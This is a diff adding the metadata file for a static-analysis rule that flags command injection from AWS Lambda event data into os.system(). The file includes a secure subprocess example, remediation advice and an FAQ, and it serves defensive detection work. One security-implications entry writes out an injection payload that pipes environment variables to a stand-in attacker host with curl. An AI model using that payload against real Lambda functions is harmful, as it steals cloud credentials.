@@ -1,0 +1,222 @@
+# Rule Identity
+id: PYTHON-LAMBDA-SEC-001
+name: Lambda Command Injection via os.system()
+short_description: Lambda event data flows to os.system(), enabling arbitrary OS command execution inside the Lambda execution environment.
+
+# Classification
+severity: CRITICAL
+category: aws_lambda
+language: python
+ruleset: python/aws_lambda/PYTHON-LAMBDA-SEC-001
+
+# Vulnerability Details
+cwe:
+  - id: CWE-78
+    name: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    url: https://cwe.mitre.org/data/definitions/78.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - python
+  - aws
+  - lambda
+  - command-injection
+  - os-system
+  - shell
+  - taint-analysis
+  - inter-procedural
+  - CWE-78
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  This rule detects OS command injection vulnerabilities in AWS Lambda functions where
+  untrusted event data flows into os.system() calls.
+
+  Lambda functions receive input from the event dictionary, which is populated by
+  triggers such as API Gateway, SQS, SNS, S3 event notifications, DynamoDB Streams,
+  and EventBridge. Unlike web frameworks, Lambda has no built-in sanitization layer
+  between the event payload and application code. Fields like event.get("body"),
+  event.get("queryStringParameters"), event["pathParameters"], and event["Records"]
+  are fully attacker-controllable when the trigger is a public API Gateway endpoint.
+
+  os.system() always passes its argument to the system shell (/bin/sh on Lambda's
+  Amazon Linux 2 runtime). When event data is embedded in the command string, an
+  attacker can inject shell metacharacters (semicolons, pipes, backticks, $()
+  substitution) to run arbitrary commands. Lambda's short-lived execution model does
+  not limit the impact: injected commands can exfiltrate environment variables
+  (including AWS credentials from AWS_ACCESS_KEY_ID and AWS_SESSION_TOKEN), read
+  /tmp contents, make outbound network calls to attacker infrastructure, and enumerate
+  the execution environment for further attacks against the associated IAM role.
+
+message: "Lambda event data flows to os.system(). Replace with subprocess.run() using a list of arguments and no shell=True."
+
+security_implications:
+  - title: AWS Credential Exfiltration
+    description: |
+      Every Lambda execution environment contains temporary AWS credentials in the
+      environment variables AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and
+      AWS_SESSION_TOKEN. An injected command like "; curl attacker.com/$(env | base64)"
+      can exfiltrate these credentials, giving an attacker the full permissions of the
+      Lambda's IAM execution role, which may include access to S3 buckets, DynamoDB
+      tables, Secrets Manager, RDS, and other AWS services.
+  - title: VPC Resource Pivoting
+    description: |
+      Lambda functions deployed inside a VPC have network access to internal resources
+      such as RDS databases, ElastiCache clusters, and internal microservices. Command
+      injection can be used to pivot from the public-facing Lambda to these protected
+      internal resources that are otherwise unreachable from the internet.
+  - title: /tmp Data Exfiltration
+    description: |
+      Lambda's /tmp directory (up to 512 MB) may contain cached data, temporary files,
+      extracted archives, or decrypted secrets placed there by previous invocations.
+      Injected commands can read and exfiltrate all of this data before the execution
+      environment is reused or recycled.
+  - title: Reverse Shell in Execution Environment
+    description: |
+      Attackers can use command injection to establish a reverse shell from within the
+      Lambda execution environment, providing interactive access for the duration of
+      the warm execution environment's lifetime and enabling manual exploration of
+      the environment, installed libraries, and network access patterns.
+
+secure_example: |
+  import subprocess
+  import re
+  import json
+
+  ALLOWED_COMMANDS = {'ping', 'nslookup', 'dig'}
+
+  def lambda_handler(event, context):
+      body = json.loads(event.get('body', '{}'))
+      host = body.get('host', '')
+      command = body.get('command', '')
+
+      # SECURE: Validate command against allowlist
+      if command not in ALLOWED_COMMANDS:
+          return {'statusCode': 400, 'body': 'Unknown command'}
+
+      # SECURE: Validate host format with strict regex
+      if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
+          return {'statusCode': 400, 'body': 'Invalid host format'}
+
+      # SECURE: Use subprocess with list arguments — no shell interpretation
+      result = subprocess.run(
+          [command, host],
+          capture_output=True,
+          text=True,
+          timeout=10
+      )
+      return {'statusCode': 200, 'body': result.stdout}
+
+recommendations:
+  - Replace all os.system() calls with subprocess.run() using a list of arguments and shell=False (the default), which prevents shell interpretation of metacharacters.
+  - Never use shell=True with any argument that originates from the Lambda event dictionary, query parameters, or any external input.
+  - Validate event fields with strict allowlists or regular expressions before they are used in any system call.
+  - Apply least-privilege IAM policies to the Lambda execution role so that credential exfiltration from command injection has minimal blast radius.
+  - Enable AWS CloudTrail and Lambda function URL access logs to detect unusual outbound patterns that may indicate active exploitation.
+
+detection_scope: |
+  This rule performs inter-procedural taint analysis with global scope. Sources are
+  Lambda event dictionary access calls: calls("event.get"), calls("event.__getitem__"),
+  and attribute accesses on the event dict including event.get("body"),
+  event.get("queryStringParameters"), event.get("pathParameters"), and
+  event["Records"]. The sink is calls("os.system") with the tainted value tracked
+  via .tracks(0) (the command string argument). Sanitizers include shlex.quote() for
+  individual arguments and explicit allowlist membership checks. The analysis follows
+  taint through variable assignments, function arguments, string concatenation, and
+  f-string interpolation across module boundaries.
+
+# References
+references:
+  - title: "CWE-78: OS Command Injection"
+    url: https://cwe.mitre.org/data/definitions/78.html
+  - title: OWASP OS Command Injection Defense Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - title: OWASP Command Injection
+    url: https://owasp.org/www-community/attacks/Command_Injection
+  - title: AWS Lambda Security Best Practices
+    url: https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html
+  - title: Python subprocess documentation - Security Considerations
+    url: https://docs.python.org/3/library/subprocess.html#security-considerations
+  - title: AWS Lambda Execution Environment
+    url: https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtime-environment.html
+
+# Compliance
+compliance:
+  - standard: CWE Top 25
+    requirement: "CWE-78 ranked #5 in 2023 Most Dangerous Software Weaknesses"
+  - standard: OWASP Top 10
+    requirement: "A03:2021 - Injection"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 - protect against injection attacks"
+  - standard: NIST SP 800-53
+    requirement: "SI-10: Information Input Validation; SI-3: Malicious Code Protection"
+  - standard: AWS Security Best Practices
+    requirement: "Apply least-privilege IAM; validate all inputs before execution"
+
+# FAQ
+faq:
+  - question: Why is Lambda command injection uniquely dangerous compared to traditional servers?
+    answer: |
+      Every Lambda execution environment automatically receives temporary AWS credentials
+      via the execution role. These credentials are available as environment variables
+      (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN) without any
+      additional authentication step. A single os.system() injection can exfiltrate these
+      credentials and give an attacker the full permissions of the Lambda's IAM role,
+      which may span multiple AWS services and accounts. Traditional servers do not
+      automatically carry cloud provider credentials in this way.
+
+  - question: Does Lambda's short-lived execution model limit the impact of command injection?
+    answer: |
+      No. The attack completes within the single Lambda invocation that triggered it.
+      Exfiltrating credentials, reading /tmp, making outbound HTTP calls, or establishing
+      a reverse shell all complete within the invocation's timeout window (up to 15
+      minutes). The short-lived model does not prevent the attack; it only means the
+      attacker must act within the invocation duration, which is ample time.
+
+  - question: Can shlex.quote() make os.system() safe with Lambda event data?
+    answer: |
+      shlex.quote() makes a single argument safe for inclusion in a shell string by
+      wrapping it in single quotes with internal single quotes escaped. However, it must
+      be applied correctly to each individual argument, and os.system() should still be
+      replaced with subprocess.run() using a list. If any argument escapes shlex.quote()
+      application (e.g., via conditional logic), injection remains possible. The safe
+      pattern is subprocess with a list and no shell=True.
+
+  - question: What if my Lambda must execute system commands for file processing?
+    answer: |
+      Use subprocess.run() with a pre-built list where executable names come from a
+      hardcoded allowlist and file arguments are validated with strict regex patterns
+      before use. For common file operations (image resizing, document conversion),
+      consider using native Python libraries (Pillow, PyPDF2) via Lambda Layers instead
+      of shelling out to system binaries, which eliminates the attack surface entirely.
+
+  - question: How do I detect if my Lambda has been exploited via command injection?
+    answer: |
+      Enable AWS CloudTrail to detect unusual API calls made with the Lambda's execution
+      role credentials. Configure VPC Flow Logs to detect unexpected outbound connections.
+      Review Lambda function logs in CloudWatch for unexpected output or error patterns.
+      Consider enabling AWS GuardDuty, which can detect credential exfiltration and
+      unusual API patterns associated with compromised Lambda execution roles.
+
+# Similar Rules
+similar_rules:
+  - PYTHON-LAMBDA-SEC-002
+  - PYTHON-LAMBDA-SEC-003
+  - PYTHON-LAMBDA-SEC-004
+  - PYTHON-LAMBDA-SEC-005
+  - PYTHON-LAMBDA-SEC-006
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
